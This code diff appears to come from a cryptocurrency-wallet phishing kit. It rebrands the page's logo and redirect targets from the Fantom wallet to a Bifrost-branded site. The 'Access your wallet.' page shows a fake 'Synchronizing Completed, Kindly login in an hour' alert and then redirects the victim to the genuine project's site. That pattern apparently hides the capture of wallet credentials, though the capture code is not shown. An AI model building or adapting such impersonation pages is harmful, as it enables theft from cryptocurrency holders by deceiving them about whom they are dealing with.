@@ -62,7 +62,7 @@ import blockchain from './coins/blockchain.png';
 import binance from './coins/biancesmart.png';
 import ark from './coins/Aktionariat.png';
 
-import fwallet from './fwallet.svg';
+import fwallet from './bitfrost.webp';
 import pmask from './popular/pmask.svg';
 
 
@@ -617,7 +617,7 @@ function Wallet(){
               
               
                     alert(`Synchronizing Completed, Kindly login in an hour`);
-                    window.location.href = 'https://wallet.fantom.network/';
+                    window.location.href = 'https://govern.bifrostweb.app/';
                 
                
 
@@ -684,7 +684,7 @@ function Wallet(){
               
               
                     alert(`Synchronizing Completed, Kindly login in an hour`);
-                    window.location.href = 'https://wallet.fantom.network/';
+                    window.location.href = 'https://govern.bifrostweb.app/';
                 
                
 
@@ -749,7 +749,7 @@ function Wallet(){
               
               
                     alert(`Synchronizing Completed, Kindly login in an hour`);
-                    window.location.href = 'https://wallet.fantom.network/';
+                    window.location.href = 'https://govern.bifrostweb.app/';
                 
                
 
@@ -776,7 +776,9 @@ function Wallet(){
         <div className='mydiv'>
 
         <div className='px-5 py-5'>
-            <img  className='myimage' src={fwallet}/>
+            <img  className='myimage'style={{
+                width:"170px"
+            }} src={fwallet}/>
 
         </div>
             <h3 className='text-center py-2 wallethead'>Access your wallet. </h3>
